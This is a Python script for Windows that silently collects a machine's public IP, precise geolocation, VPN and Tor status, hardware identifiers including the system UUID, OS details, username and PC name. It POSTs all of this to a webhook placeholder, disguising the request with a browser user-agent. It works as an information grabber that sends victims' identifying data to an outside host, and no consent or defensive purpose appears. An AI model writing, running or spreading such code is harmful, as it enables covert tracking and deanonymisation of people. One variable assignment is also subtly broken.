from psutil import virtual_memory, cpu_count
from requests import get, post, exceptions
from subprocess import check_output
import platform as p

webhook_url = "WEBHOOK_URL"

#####! IP and geolocation data !#####
api = get('https://api.ipapi.is').json()

ip = api['ip']
is_tor = api['is_tor']
is_proxy = api['is_proxy']
registrar = api['rir']
company = api['asn']['org']
abuser_score = api['company']['abuser_score'].split('(')[1].split(')')[0]

country = api['location']['country']
city = api['location']['city']
state = api['location']['state']
latitude = api['location']['latitude']
longitude = api['location']['longitude']
zip_code = api['location']['zip']
timezone = api['location']['timezone']

is_vpn = False
vpn_provider = []

if "M247" in company: vpn_provider = ["Proton", "Kaspersky", "Windscribe", "Hotspot Shield"]
elif "Datacamp" in company: vpn_provider = ["Proton", "Windscribe"]
elif "NForce" in company: vpn_provider = ["Proton"]
elif "WorldStream" in company: vpn_provider = ["Proton"]
elif "EstNOC" in company: vpn_provider = ["Proton"]
elif "Farice" in company: vpn_provider = ["Proton"]
elif "Host Universal" in company: vpn_provider = ["Proton"]
elif "Anchorfree" in company: vpn_provider = ["Kaspersky", "Hotspot Shield"]
elif "Latitude.sh" in company: vpn_provider = ["Kaspersky", "Hotspot Shield"]
elif "TR1 Net" in company: vpn_provider = ["Kaspersky"]
elif "Leaseweb" in company: vpn_provider = ["Kaspersky"]
elif "20 Point" in company: vpn_provider = ["Kaspersky"]
elif "24SHELLS" in company: vpn_provider = ["Kaspersky"]
elif "Private Customer" in company: vpn_provider = ["Kaspersky"]
elif "RoyaleHosting" in company: vpn_provider = ["Hide.me"]
elif "tzulo" in company: vpn_provider = ["Windscribe"]
elif "QuadraNet" in company: vpn_provider = ["Windscribe"]
elif "Performive" in company: vpn_provider = ["Windscribe"]
elif "Amanah Tech" in company: vpn_provider = ["Windscribe"]
elif "HostSlim" in company: vpn_provider = ["Windscribe"]
elif "Privado Networks" in company: vpn_provider = ["PrivadoVPN"]
elif "Eweka Internet Services" in company: vpn_provider = ["PrivadoVPN"]
elif "Base IP" in company: vpn_provider = ["PrivadoVPN"]
elif "Net1 GmbH" in company: vpn_provider = ["NordVPN"]

if abuser_score == "High":
    networkSuspicious = True
elif abuser_score == "Elevated":
    networkSuspicious = True
elif abuser_score == "Low":
    networkSuspicious = False
elif abuser_score == "Very Low":
    networkSuspicious = False
else:
    networkSuspicious: False

if vpn_provider == []:
    pass
else:
    is_vpn = True
    networkSuspicious = True

#####! Hardware information !#####
cpu = check_output("wmic cpu get Name", shell=True)
cpu = [line.strip() for line in cpu.decode().split("\n") if line.strip() and "Name" not in line][0]
cpu_threads = cpu_count()
cpu_technical = p.processor()

gpu = check_output("wmic path win32_VideoController get name", shell=True)
gpu = [line.strip() for line in gpu.decode().split("\n") if line.strip() and "Name" not in line]

ram = virtual_memory()
ram_GiB = ram.total / (1024**3)

try:
    uuid = check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
except:
    uuid = "None"

#####! Operating system and software information !#####
arch = p.architecture()[0]
release = p.release()
version = p.version()
edition = p.win32_edition()
operating_system = p.system()


#####! Personal information !#####
whoami = check_output("whoami", shell=True, text=True).strip()
pc_name = p.node()
username = whoami.split("\\")[-1] if "\\" in whoami else whoami.split("/")[-1]

data = {
    "network":{
        "ip":ip,
        "is_vpn":is_vpn,
        "is_tor":is_tor,
        "company":company,
        "suspicious":networkSuspicious,
        "vpn_provider":vpn_provider
    },
    "geolocation":{
        "country":country,
        "state":state,
        "city":city,
        "latitude":latitude,
        "longitude":longitude,
        "zip_code":zip_code,
        "timezone":timezone
    },
    "hardware":{
        "cpu":cpu,
        "cpu_threads":cpu_threads,
        "cpu_technical":cpu_technical,
        "gpu":gpu,
        "ram_GiB":ram_GiB,
        "uuid":uuid
    },
    "software":{
        "os":operating_system,
        "release":release,
        "version":version,
        "edition":edition,
        "arch":arch
    },
    "personal":{
        "pc_name":pc_name,
        "username":username
    }
}

try:
    headers = {
        "Content-Type": "application/json",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
        }
    response = post(webhook_url, headers=headers, json=data)
    response.raise_for_status()
except exceptions.RequestException as e:
    print(f"Failed to send data: {str(e)}")